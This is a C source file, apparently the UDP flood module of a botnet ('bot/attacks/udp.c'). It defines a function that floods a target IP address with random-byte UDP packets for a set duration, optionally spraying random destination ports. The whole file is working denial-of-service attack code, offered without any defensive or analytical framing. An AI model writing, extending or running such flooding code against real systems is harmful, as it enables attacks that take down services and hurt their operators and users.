// language: c
// file: bot/attacks/udp.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux socket-based UDP flood implementation with customizable payloads and randomized ports

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "udp.h"

void attack_udp(uint32_t target_ip, uint16_t port, uint8_t duration, uint16_t len, uint8_t randomize_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = target_ip;

    char *buf = malloc(len);
    if (!buf) {
        close(sock);
        return;
    }

    // Fill buffer with pseudo-random or static pattern data
    for (int i = 0; i < len; i++) {
        buf[i] = (char)(rand() % 256);
    }

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        if (randomize_port) {
            sin.sin_port = htons((uint16_t)(rand() % 65535 + 1));
        }
        sendto(sock, buf, len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    free(buf);
    close(sock);
}